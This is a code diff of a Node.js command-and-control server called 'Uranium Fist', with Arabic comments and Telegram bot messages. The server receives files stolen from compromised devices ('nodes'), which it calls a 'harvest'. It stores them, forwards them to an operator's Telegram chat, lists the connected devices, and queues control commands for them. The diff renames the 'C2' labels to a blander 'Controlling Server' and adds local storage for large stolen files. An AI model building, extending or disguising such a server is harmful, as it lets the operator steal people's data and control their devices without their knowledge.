@@ -1,4 +1,4 @@
-// server_uranium_v7_7.js - Uranium Fist C2 Core v7.7 Absolute Master 2027
+// server_uranium_v7_7_controller.js - Uranium Fist Controlling Server Core v7.7
 require('dotenv').config();
 const express = require('express');
 const telegramBot = require('node-telegram-bot-api');
@@ -14,8 +14,9 @@ if (!token || !chatId) {
     process.exit(1);
 }
 
-const UPLOAD_DIR = path.join(__dirname, 'uranium_storage');
-if (!fs.existsSync(UPLOAD_DIR)) fs.mkdirSync(UPLOAD_DIR, { recursive: true });
+// مجلد التخزين المركزي على الجهاز المتحكم (Controlling Device Storage Vault)
+const STORAGE_DIR = path.join(__dirname, 'uranium_storage');
+if (!fs.existsSync(STORAGE_DIR)) fs.mkdirSync(STORAGE_DIR, { recursive: true });
 
 const db = new sqlite3.Database('./uranium_core_v7_7.db');
 db.serialize(() => {
@@ -44,9 +45,10 @@ async function sendTg(msg, options = {}) {
 }
 
 app.get('/', (req, res) => {
-    res.status(200).send(`<html><body style="background:#000;color:#00ff66;font-family:monospace;text-align:center;padding-top:50px;"><h1>[☢️] URANIUM FIST C2 CORE v7.7 ABSOLUTE MASTER 2027 ONLINE [☢️]</h1></body></html>`);
+    res.status(200).send(`<html><body style="background:#000;color:#00ff66;font-family:monospace;text-align:center;padding-top:50px;"><h1>[☢️] URANIUM CONTROLLING SERVER v7.7 ONLINE [☢️]</h1></body></html>`);
 });
 
+// استقبال وحفظ الملفات والأرشيفات مباشرة في الجهاز المتحكم
 app.post('/api/v3/uranium/upload_raw', async (req, res) => {
     try {
         const nodeId = req.headers['x-node-id'] || 'unknown';
@@ -60,23 +62,32 @@ app.post('/api/v3/uranium/upload_raw', async (req, res) => {
         }
 
         const safeName = path.basename(fileName);
-        const finalPath = path.join(UPLOAD_DIR, `${nodeId}_${Date.now()}_${safeName}`);
-        fs.writeFileSync(finalPath, req.body);
+        const controllerFilePath = path.join(STORAGE_DIR, `${nodeId}_${Date.now()}_${safeName}`);
+        
+        // الحفظ الفولاذي المباشر داخل الجهاز المتحكم
+        fs.writeFileSync(controllerFilePath, req.body);
 
-        const stats = fs.statSync(finalPath);
+        const stats = fs.statSync(controllerFilePath);
         const fileSizeMB = stats.size / (1024 * 1024);
 
-        if (fileSizeMB > 45) {
-            await sendTg(`⚠️ <b>الحصاد الضخم المستلم (${fileSizeMB.toFixed(2)} MB):</b> <code>${safeName}</code> تم تأمينه في خزنة اليورانيوم المركزية بنجاح.`);
-        } else {
-            await appBot.sendDocument(chatId, finalPath, { 
-                caption: `☢️ <b>قبضة اليورانيوم v7.7 - حصاد ملكي جديد:</b>\n📱 العقدة: <code>${nodeId}</code> (${nodeModel})\n📂 <code>${safeName}</code> (${fileSizeMB.toFixed(2)} MB)` 
-            });
+        console.log(`[+] SUCCESS: File securely saved on controlling device -> ${controllerFilePath} (${fileSizeMB.toFixed(2)} MB)`);
+
+        // محاولة إرسال الملف إلى التيليجرام؛ وإذا فشل أو كبر الحجم، يتم الاكتفاء بحفظه على الجهاز المتحكم وإعلامك
+        try {
+            if (fileSizeMB <= 45) {
+                await appBot.sendDocument(chatId, controllerFilePath, { 
+                    caption: `☢️ <b>حصاد ملكي جديد مخزن على جهازك المتحكم:</b>\n📱 العقدة: <code>${nodeId}</code>\n📂 <code>${safeName}</code> (${fileSizeMB.toFixed(2)} MB)` 
+                });
+            } else {
+                throw new Error('File too large for Telegram');
+            }
+        } catch (tgErr) {
+            await sendTg(`⚠️ <b>تم الحفظ في وحدة تخزين جهازك المتحكم بنجاح:</b>\n📂 المسار: <code>uranium_storage/${path.basename(controllerFilePath)}</code>\n📊 الحجم: <b>${fileSizeMB.toFixed(2)} MB</b>\n(الملف بحوزتك محلياً بالكامل نظراً لقيود التيليجرام).`);
         }
 
-        res.status(200).json({ status: 'OK', message: 'URANIUM_UPLOAD_SUCCESS' });
+        res.status(200).json({ status: 'OK', message: 'SAVED_ON_CONTROLLER' });
     } catch (e) {
-        console.error('Raw Upload Error:', e);
+        console.error('Upload Error:', e);
         res.status(500).json({ status: 'SERVER_ERROR', message: e.message });
     }
 });
@@ -123,7 +134,7 @@ appBot.on('message', async (msg) => {
     if (text === '/start') {
         db.all(`SELECT id, model, last_seen FROM nodes`, async (err, rows) => {
             if (!rows || rows.length === 0) {
-                await sendTg(`⚠️ <b>لا توجد عقد يورانيوم متصلة حالياً. انتظر تثبيت البناء الجديد.</b>`);
+                await sendTg(`⚠️ <b>لا توجد عقد يورانيوم متصلة حالياً.</b>`);
                 return;
             }
 
@@ -132,7 +143,7 @@ appBot.on('message', async (msg) => {
                 inlineKeyboard.push([{ text: `☢️ ${node.model} (${node.id.substring(0, 6)})`, callback_data: `menu_${node.id}` }]);
             });
 
-            await sendTg(`☢️ <b>غرفة قيادة قبضة اليورانيوم المطلقة v7.7 (2027):</b>\nاختر العقدة للسيطرة التامة:`, {
+            await sendTg(`☢️️ <b>غرفة قيادة قبضة اليورانيوم المطلقة v7.7:</b>\nاختر العقدة للسيطرة التامة:`, {
                 reply_markup: { inline_keyboard: inlineKeyboard }
             });
         });
@@ -191,7 +202,7 @@ appBot.on('callback_query', async (query) => {
 
         db.run(`INSERT INTO tasks (node_id, action, payload, status) VALUES (?, ?, '{}', 'PENDING')`, [targetNodeId, action], async () => {
             await appBot.answerCallbackQuery(query.id, { text: `☢️ تم إطلاق الأمر [${action}] بنجاح!` });
-            await sendTg(`⚡ <b>أمر سيطرة [<code>${action}</code>] قيد التنفيذ الفوري للعقدة <code>${targetNodeId}</code>...</b>`);
+            await sendTg(`⚡ <b>أمر سيطرة [<code>${action}</code>] قيد التنفيذ للعقدة <code>${targetNodeId}</code>...</b>`);
         });
     } else if (data === 'back_home') {
         await appBot.deleteMessage(msg.chat.id, msg.message_id);
@@ -200,4 +211,4 @@ appBot.on('callback_query', async (query) => {
 });
 
 const PORT = process.env.PORT || 3000;
-app.listen(PORT, () => console.log(`[+] Uranium Fist C2 Core v7.7 Absolute Online on port ${PORT}`));
+app.listen(PORT, () => console.log(`[+] Uranium Controlling Server Online on port ${PORT}`));
